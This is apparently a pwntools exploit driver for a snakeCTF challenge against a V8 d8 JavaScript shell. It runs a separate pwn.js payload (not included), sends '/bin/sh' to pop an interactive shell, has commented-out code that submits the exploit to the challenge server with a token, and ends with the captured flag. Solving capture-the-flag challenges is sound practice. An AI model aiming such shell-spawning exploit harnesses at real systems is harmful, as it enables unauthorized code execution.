#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import base64

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './d8'
#context.terminal = ['tmux', 'new-window']
context.terminal = ["tmux", "splitw", "-hb"]
argv = []
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def mask(addr, target):
    return target ^ (addr >> 12)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

argv = ["--allow-natives-syntax", "./pwn.js"]

HOST = "is-this-web.challs.snakectf.org"
PORT = 1337

'''
io = process(["ncat", "--ssl", HOST, str(PORT)])
io.sendlineafter("token: ", "d666539eec83ee9e97801f8294819322")
exploit = base64.b64encode(open("pwn.js", "rb").read())
io.sendlineafter("exploit:", exploit)
io.sendlineafter("TRIGGER", "/usr/bin/sh\x00")
io.interactive()
'''

io = start(argv, env=env)

io.sendlineafter("TRIGGER", "/bin/sh\x00")
#io.sendline("/bin/sh\x00")

io.interactive()
# snakeCTF{uhmm...i_d0n7_7hink_7his_is_wh47_w3b_m34ns_usu4lly_806e01f3cdbd5168}